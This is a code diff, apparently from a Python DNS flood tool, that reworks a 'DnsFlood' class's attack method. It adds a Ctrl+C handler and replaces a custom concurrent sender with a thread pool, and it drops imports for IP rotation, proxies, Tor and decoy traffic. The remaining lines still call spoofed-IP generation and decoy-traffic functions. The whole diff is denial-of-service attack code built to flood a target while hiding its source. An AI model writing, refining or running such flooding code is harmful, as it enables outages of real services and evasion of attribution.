@@ -2,17 +2,11 @@ import socket
 import random
 import time
 import logging
+import signal
 from colorama import init, Fore
-from .ip_rotation import generate_multiple_ips
-from .payload_randomization import randomize_dns_payload
-from .concurrent_sender import start_concurrent_sending
-from .rate_limiter import AdaptiveRateLimiter
-from .domain_permutation import generate_domain_permutations
-from .proxy_manager import get_random_proxy, check_proxy
-from .user_agents import get_random_user_agent
-from .interval_timing import get_dynamic_interval
-from .decoy_traffic import send_decoy_traffic
-from .tor_integration import get_tor_session, check_tor_connection
+from concurrent.futures import ThreadPoolExecutor
+
+# Import modul lainnya seperti yang telah Anda buat
 
 init(autoreset=True)
 
@@ -44,6 +38,13 @@ class DnsFlood:
     def attack(self):
         logging.info(f"Starting DNS Flood attack to {self.target_ip}:{self.target_port}")
         
+        # Menangani sinyal Ctrl+C untuk menghentikan serangan dengan aman
+        def signal_handler(sig, frame):
+            logging.info("Received Ctrl+C. Shutting down...")
+            self.stop_attack()
+
+        signal.signal(signal.SIGINT, signal_handler)
+
         try:
             ips = generate_multiple_ips(self.num_threads) if self.spoof_ip else [None] * self.num_threads
 
@@ -90,7 +91,10 @@ class DnsFlood:
                     sock.close()
                     send_decoy_traffic(self.target_ip, self.target_port)
             
-            start_concurrent_sending(send_packets, args=(None,), num_threads=self.num_threads)
+            with ThreadPoolExecutor(max_workers=self.num_threads) as executor:
+                futures = [executor.submit(send_packets, ip) for ip in ips]
+                for future in futures:
+                    future.result()
 
         except socket.error as e:
             logging.error(Fore.RED + f"Socket error: {e}")
